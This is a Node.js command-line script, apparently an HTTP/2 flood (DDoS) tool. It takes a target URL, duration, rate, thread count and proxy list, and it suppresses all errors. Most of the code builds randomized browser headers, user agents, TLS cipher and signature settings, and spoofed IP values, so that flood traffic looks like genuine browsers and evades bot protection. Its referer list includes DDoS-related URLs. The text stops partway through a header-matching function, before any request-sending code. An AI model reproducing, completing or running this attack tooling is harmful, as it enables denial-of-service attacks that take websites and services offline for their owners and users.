const net = require("net");
 const http2 = require("http2");
 const tls = require("tls");
 const cluster = require("cluster");
 const url = require("url");
 const crypto = require("crypto");
 const fs = require("fs");
 const { HeaderGenerator } = require('header-generator');

const errorHandler = error => {
    //console.log(error);
};
process.on("uncaughtException", errorHandler);
process.on("unhandledRejection", errorHandler);

 process.setMaxListeners(0);
 require("events").EventEmitter.defaultMaxListeners = 0;
 process.on('uncaughtException', function (exception) {
  });

 if (process.argv.length < 7){console.log(`Usage: target time rate thread proxyfile`); process.exit();}
 const headers = {};
  function readLines(filePath) {
     return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
 }
 
 function randomIntn(min, max) {
     return Math.floor(Math.random() * (max - min) + min);
 }
 
 function randomElement(elements) {
     return elements[randomIntn(0, elements.length)];
 } 
 
 function randstr(length) {
   const characters =
     "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
   let result = "";
   const charactersLength = characters.length;
   for (let i = 0; i < length; i++) {
     result += characters.charAt(Math.floor(Math.random() * charactersLength));
   }
   return result;
 }
 
 const ip_spoof = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 255);
   };
   return `${getRandomByte()}.${getRandomByte()}.${getRandomByte()}.${getRandomByte()}`;
 };
 
 const spoofed = ip_spoof();

 const ip_spoof2 = () => {
   const getRandomByte = () => {
     return Math.floor(Math.random() * 9999);
   };
   return `${getRandomByte()}`;
 };
 
 const spoofed2 = ip_spoof2();
 
 const args = {
     target: process.argv[2],
     time: parseInt(process.argv[3]),
     Rate: parseInt(process.argv[4]),
     threads: parseInt(process.argv[5]),
     proxyFile: process.argv[6]
 }

let headerGenerator = new HeaderGenerator({
    browsers: [
        //{ name: "opera", httpVersion: "2" },
	{ name: "firefox", minVersion: 112, httpVersion: "2" },
        { name: "chrome", minVersion: 112, httpVersion: "2" },
    ],
    devices: [
        "mobile",
        //"tablet",
        "desktop",
    ],
    operatingSystems: [
        "linux",
        "windows",
        "macos",
        //"android",
        //"ios",
    ],
});

let randomHeaders = headerGenerator.getHeaders();
 const sig = [    
    'ecdsa_secp256r1_sha256',
    'ecdsa_secp384r1_sha384',
    'ecdsa_secp521r1_sha512',
    'rsa_pss_rsae_sha256',
    'rsa_pss_rsae_sha384',
    'rsa_pss_rsae_sha512',
    'rsa_pkcs1_sha256',
    'rsa_pkcs1_sha384',
    'rsa_pkcs1_sha512'
 ];
 const sigalgs1 = sig.join(':');
 const cplist = [
 'TLS_AES_128_CCM_8_SHA256',
 'TLS_AES_128_CCM_SHA256',
 'TLS_CHACHA20_POLY1305_SHA256',
 'TLS_AES_256_GCM_SHA384',
 'TLS_AES_128_GCM_SHA256',
 "ECDHE-ECDSA-AES128-GCM-SHA256", 
 "ECDHE-ECDSA-CHACHA20-POLY1305", 
 "ECDHE-RSA-AES128-GCM-SHA256", 
 "ECDHE-RSA-CHACHA20-POLY1305", 
 "ECDHE-ECDSA-AES256-GCM-SHA384", 
 "ECDHE-RSA-AES256-GCM-SHA384"
 ];
 const accept_header = [
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", 
  "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,en-US;q=0.5',
  'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8,en;q=0.7',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/atom+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/rss+xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/ld+json;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-dtd;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,application/xml-external-parsed-entity;q=0.9',
  'text/html; charset=utf-8',
  'application/json, text/plain, */*',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/xml;q=0.9',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8,text/plain;q=0.8',
  'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
 ]; 
 lang_header = [
  'ko-KR',
  'en-US',
  'zh-CN',
  'zh-TW',
  'ja-JP',
  'en-GB',
  'en-AU',
  'en-GB,en-US;q=0.9,en;q=0.8',
  'en-GB,en;q=0.5',
  'en-CA',
  'en-UK, en, de;q=0.5',
  'en-NZ',
  'en-GB,en;q=0.6',
  'en-ZA',
  'en-IN',
  'en-PH',
  'en-SG',
  'en-HK',
  'en-GB,en;q=0.8',
  'en-GB,en;q=0.9',
  ' en-GB,en;q=0.7',
  '*',
  'en-US,en;q=0.5',
  'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
  'utf-8, iso-8859-1;q=0.5, *;q=0.1',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-GB, en-US, en;q=0.9',
  'de-AT, de-DE;q=0.9, en;q=0.5',
  'cs;q=0.5',
  'da, en-gb;q=0.8, en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'tr',
  'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2'
 ];
 
 const encoding_header = [
  '*',
  '*/*',
  'gzip',
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  'gzip, deflate',
  'br',
  'br;q=1.0, gzip;q=0.8, *;q=0.1',
  'gzip;q=1.0, identity; q=0.5, *;q=0',
  'gzip, deflate, br;q=1.0, identity;q=0.5, *;q=0.25',
  'compress;q=0.5, gzip;q=1.0',
  'identity',
  'gzip, compress',
  'compress, deflate',
  'compress',
  'gzip, deflate, br',
  'deflate',
  'gzip, deflate, lzma, sdch',
  'deflate',
 ];
 
 const control_header = [
  'max-age=604800',
  'proxy-revalidate',
  'public, max-age=0',
  'max-age=315360000',
  'public, max-age=86400, stale-while-revalidate=604800, stale-if-error=604800',
  's-maxage=604800',
  'max-stale',
  'public, immutable, max-age=31536000',
  'must-revalidate',
  'private, max-age=0, no-store, no-cache, must-revalidate, post-check=0, pre-check=0',
  'max-age=31536000,public,immutable',
  'max-age=31536000,public',
  'min-fresh',
  'private',
  'public',
  's-maxage',
  'no-cache',
  'no-cache, no-transform',
  'max-age=2592000',
  'no-store',
  'no-transform',
  'max-age=31557600',
  'stale-if-error',
  'only-if-cached',
  'max-age=0',
 ];
 
 const refers = [
  "https://www.google.com/search?q=",
  "https://check-host.net/",
  "https://www.facebook.com/",
  "https://www.youtube.com/",
  "https://www.fbi.com/",
  "https://www.bing.com/search?q=",
  "https://r.search.yahoo.com/",
  "https://www.cia.gov/index.html",
  "https://vk.com/profile.php?redirect=",
  "https://www.usatoday.com/search/results?q=",
  "https://help.baidu.com/searchResult?keywords=",
  "https://steamcommunity.com/market/search?q=",
  "https://www.ted.com/search?q=",
  "https://play.google.com/store/search?q=",
  "https://www.qwant.com/search?q=",
  "https://soda.demo.socrata.com/resource/4tka-6guv.json?$q=",
  "https://www.google.ad/search?q=",
  "https://www.google.ae/search?q=",
  "https://www.google.com.af/search?q=",
  "https://www.google.com.ag/search?q=",
  "https://www.google.com.ai/search?q=",
  "https://www.google.al/search?q=",
  "https://www.google.am/search?q=",
  "https://www.google.co.ao/search?q=",
  "http://anonymouse.org/cgi-bin/anon-www.cgi/",
  "http://coccoc.com/search#query=",
  "http://ddosvn.somee.com/f5.php?v=",
  "http://engadget.search.aol.com/search?q=",
  "http://engadget.search.aol.com/search?q=query?=query=&q=",
  "http://eu.battle.net/wow/en/search?q=",
  "http://filehippo.com/search?q=",
  "http://funnymama.com/search?q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r&q=",
  "http://go.mail.ru/search?gay.ru.query=1&q=?abc.r/",
  "http://go.mail.ru/search?mail.ru=1&q=",
  "http://help.baidu.com/searchResult?keywords=",
  "http://host-tracker.com/check_page/?furl=",
  "http://itch.io/search?q=",
  "http://jigsaw.w3.org/css-validator/validator?uri=",
  "http://jobs.bloomberg.com/search?q=",
  "http://jobs.leidos.com/search?q=",
  "http://jobs.rbs.com/jobs/search?q=",
  "http://king-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://louis-ddosvn.rhcloud.com/f5.html?v=",
  "http://millercenter.org/search?q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0&q=",
  "http://nova.rambler.ru/search?=btnG?=%D0?2?%D0?2?%=D0/",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B&q=",
  "http://nova.rambler.ru/search?btnG=%D0%9D%?D0%B0%D0%B/",
  "http://page-xirusteam.rhcloud.com/f5ddos3.html?v=",
  "http://php-hrdevil.rhcloud.com/f5ddos3.html?v=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x&q=",
  "http://ru.search.yahoo.com/search;?_query?=l%t=?=?A7x/",
  "http://ru.search.yahoo.com/search;_yzt=?=A7x9Q.bs67zf&q="
 ];
 const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
 const ciphers1 = "GREASE:" + [
     defaultCiphers[2],
     defaultCiphers[1],
     defaultCiphers[0],
     ...defaultCiphers.slice(3)
 ].join(":");
 
 const uap = [
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edge/12.0",
 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edge/12.0",
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36 Edge/12.0",
 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36 Edge/12.0",
 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edge/12.0",
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36",
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36",
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edge/12.0",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Macintosh; Intel Mac OS X 13_5_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36 Edge/12.0",
 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/106.0.0.0 Safari/537.36 Edge/12.0",
 "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
 "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36 Edge/12.0"
 ];

  platform = [
    'Linux',
    'macOS',
    'Windows'
  ];

 version = [
    '"Chromium";v="116", "Not)A;Brand";v="8", "Google Chrome";v="116"',
    '"Chromium";v="115", "Not)A;Brand";v="8", "Google Chrome";v="115"',
    '"Chromium";v="114", "Not)A;Brand";v="8", "Google Chrome";v="114"',
    '"Chromium";v="113", "Not)A;Brand";v="8", "Google Chrome";v="113"',
    '"Chromium";v="112", "Not)A;Brand";v="8", "Google Chrome";v="112"',
    '"Chromium";v="116", "Not)A;Brand";v="24", "Google Chrome";v="116"',
    '"Chromium";v="115", "Not)A;Brand";v="24", "Google Chrome";v="115"',
    '"Chromium";v="114", "Not)A;Brand";v="24", "Google Chrome";v="114"',
    '"Chromium";v="113", "Not)A;Brand";v="24", "Google Chrome";v="113"',
    '"Chromium";v="112", "Not)A;Brand";v="24", "Google Chrome";v="112"',
    '"Chromium";v="116", "Not)A;Brand";v="99", "Google Chrome";v="116"',
    '"Chromium";v="115", "Not)A;Brand";v="99", "Google Chrome";v="115"',
    '"Chromium";v="114", "Not)A;Brand";v="99", "Google Chrome";v="114"',
    '"Chromium";v="113", "Not)A;Brand";v="99", "Google Chrome";v="113"',
    '"Chromium";v="112", "Not)A;Brand";v="99", "Google Chrome";v="112"'
 ];

 const a6 = [
  '"Chromium";v="116.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="116.0.0.0"',
  '"Chromium";v="115.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="115.0.0.0"',
  '"Chromium";v="114.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="114.0.0.0"',
  '"Chromium";v="113.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="113.0.0.0"',
  '"Chromium";v="112.0.0.0", "Not)A;Brand";v="8.0.0.0", "Google Chrome";v="112.0.0.0"',
  '"Chromium";v="116.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="116.0.0.0"',
  '"Chromium";v="115.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="115.0.0.0"',
  '"Chromium";v="114.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="114.0.0.0"',
  '"Chromium";v="113.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="113.0.0.0"',
  '"Chromium";v="112.0.0.0", "Not)A;Brand";v="24.0.0.0", "Google Chrome";v="112.0.0.0"',
  '"Chromium";v="116.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="116.0.0.0"',
  '"Chromium";v="115.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="115.0.0.0"',
  '"Chromium";v="114.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="114.0.0.0"',
  '"Chromium";v="113.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="113.0.0.0"',
  '"Chromium";v="112.0.0.0", "Not)A;Brand";v="99.0.0.0", "Google Chrome";v="112.0.0.0"',
 ];
  site = [
    'cross-site',
	'same-origin',
	'same-site',
	'none'
  ];
  
  mode = [
    'cors',
	'navigate',
	'no-cors',
	'same-origin'
  ];
  
  dest = [
    'document',
	'image',
	'embed',
	'empty',
	'frame'
  ];

 var cipper = cplist[Math.floor(Math.floor(Math.random() * cplist.length))];
 var siga = sig[Math.floor(Math.floor(Math.random() * sig.length))];
 var a = a6[Math.floor(Math.floor(Math.random() * a6.length))];
 var site1 = site[Math.floor(Math.floor(Math.random() * site.length))];
 var mode1 = mode[Math.floor(Math.floor(Math.random() * mode.length))];
 var dest1 = dest[Math.floor(Math.floor(Math.random() * dest.length))];
 var ver = version[Math.floor(Math.floor(Math.random() * version.length))];
 var platforms = platform[Math.floor(Math.floor(Math.random() * platform.length))];
 var uap1 = uap[Math.floor(Math.floor(Math.random() * uap.length))];
 var Ref = refers[Math.floor(Math.floor(Math.random() * refers.length))];
 var accept = accept_header[Math.floor(Math.floor(Math.random() * accept_header.length))];
 var lang = lang_header[Math.floor(Math.floor(Math.random() * lang_header.length))];
 var encoding = encoding_header[Math.floor(Math.floor(Math.random() * encoding_header.length))];
 var control = control_header[Math.floor(Math.floor(Math.random() * control_header.length))];
 var proxies = readLines(args.proxyFile);
 const parsedTarget = url.parse(args.target);

const rateHeaders = [
{ "referer": "https://" + randstr(4) + ".com" },
{ "origin": "https://" + parsedTarget.path },
{ "downlink": "1.7" },
{ "viewport-width": "1920" },
{ "width": "1080" },
{ "cookie": randstr(20) },
{ "memory-device": spoofed2 },
];
const rateHeaders2 = [
{ "referer": "https://" + randstr(4) + ".com" },
{ "origin": "https://" + parsedTarget.path },
{ "downlink": "1.7" },
{ "viewport-width": "1920" },
{ "width": "1080" },
{ "cookie": randstr(20) },
{ "memory-device": spoofed2 },
];

  function getRandomUserAgent() {
	  return uap[Math.floor(Math.random() * uap.length)];
  }
  
  let sec1, sec2, sec3, sec4, sec5;
  
  function updateSecValues() {
	  var randomUserAgent = getRandomUserAgent();
	  if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36") {
		  sec1 = '"Chromium";v="116", " Not A;Brand";v="55", "Google Chrome";v="116"';
		  sec2 = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36';
		  sec3 = "Windows";
		  sec4 = "116.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Chromium";v="116.0.0.0", " Not A;Brand";v="55.0.0.0", "Google Chrome";v="116.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36") {
		  sec1 = '" Not;A Brand";v="31", "Google Chrome";v="115", "Chromium";v="115"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36";
		  sec3 = "Windows";
		  sec4 = "115.0.0.0";
                  sec5 = "10.0";
                  sec6 = '" Not;A Brand";v="31.0.0.0", "Google Chrome";v="115.0.0.0", "Chromium";v="115.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36") {
		  sec1 = '" Not A;Brand";v="21", "Chromium";v="114", "Google Chrome";v="114"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36";
		  sec3 = "Windows";
		  sec4 = "114.0.0.0";
                  sec5 = "10.0";
                  sec6 = '" Not;A Brand";v="21.0.0.0", "Google Chrome";v="114.0.0.0", "Chromium";v="114.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36") {
		  sec1 = '"Google Chrome";v="113", "Chromium";v="113", ";Not A Brand";v="20"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36";
		  sec3 = "Windows";
		  sec4 = "113.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Google Chrome";v="113.0.0.0", "Chromium";v="113.0.0.0", ";Not A Brand";v="20.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36") {
		  sec1 = '"Google Chrome";v="112", "Chromium";v="112", ";Not A Brand";v="28"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.0.0 Safari/537.36";
		  sec3 = "Windows";
		  sec4 = "112.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Google Chrome";v="112.0.0.0", "Chromium";v="112.0.0.0", ";Not A Brand";v="28.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36") {
		  sec1 = '"Google Chrome";v="111", "Chromium";v="111", ";Not A Brand";v="22"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36";
		  sec3 = "Windows";
		  sec4 = "111.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Google Chrome";v="111.0.0.0", "Chromium";v="111.0.0.0", ";Not A Brand";v="22.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36") {
		  sec1 = '"Google Chrome";v="110", "Chromium";v="110", ";Not A Brand";v="4"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36";
		  sec3 = "Windows";
		  sec4 = "110.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Google Chrome";v="110.0.0.0", "Chromium";v="110.0.0.0", ";Not A Brand";v="4.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36") {
		  sec1 = '"Google Chrome";v="109", "Chromium";v="109", ";Not A Brand";v="1"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36";
		  sec3 = "Windows";
		  sec4 = "109.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Google Chrome";v="109.0.0.0", "Chromium";v="109.0.0.0", ";Not A Brand";v="1.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36") {
		  sec1 = '"Google Chrome";v="108", "Chromium";v="108", ";Not A Brand";v="13"';
		  sec2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36";
		  sec3 = "Windows";
		  sec4 = "108.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Google Chrome";v="108.0.0.0", "Chromium";v="108.0.0.0", ";Not A Brand";v="13.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36") {
		  sec1 = '"Chromium";v="116", " Not A;Brand";v="75", "Google Chrome";v="116"';
		  sec2 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36";
		  sec3 = "Linux";
		  sec4 = "116.0.0.0";
                  sec5 = "10.0";
                  sec6 = '"Chromium";v="116.0.0.0", " Not A;Brand";v="75.0.0.0", "Google Chrome";v="116.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36") {
		  sec1 = '" Not;A Brand";v="73", "Google Chrome";v="115", "Chromium";v="115"';
		  sec2 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36";
		  sec3 = "Linux";
		  sec4 = "115.0.0.0";
                  sec5 = "10.0";
                  sec6 = '" Not;A Brand";v="73.0.0.0", "Google Chrome";v="115.0.0.0", "Chromium";v="115.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36") {
		  sec1 = '" Not;A Brand";v="56", "Google Chrome";v="114", "Chromium";v="114"';
		  sec2 = "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.0.0 Safari/537.36";
		  sec3 = "Linux";
		  sec4 = "114.0.0.0";
                  sec5 = "10.0";
                  sec6 = '" Not;A Brand";v="56.0.0.0", "Google Chrome";v="114.0.0.0", "Chromium";v="114.0.0.0"';
                  sec7 = "document";
                  sec8 = "navigate";
                  sec9 = "same-origin";
	  } else if (randomUserAgent === "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36") {
